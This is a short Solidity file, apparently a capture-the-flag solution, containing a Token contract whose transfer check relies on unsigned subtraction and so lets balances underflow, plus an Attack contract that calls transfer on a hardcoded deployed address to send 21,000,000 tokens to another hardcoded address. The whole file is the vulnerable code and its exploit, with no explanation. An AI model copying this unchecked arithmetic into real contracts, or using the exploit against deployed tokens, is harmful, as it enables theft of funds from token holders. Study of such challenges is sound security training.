// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract Attack {
    function hack() public {
        
        Token(0x923902e48b99fb63cFB88068aA583D06557aBA5A).transfer(0x965ca4F0648c223C3B09e1E8bA46F9f71f7df1b8, 21000000);
    }
}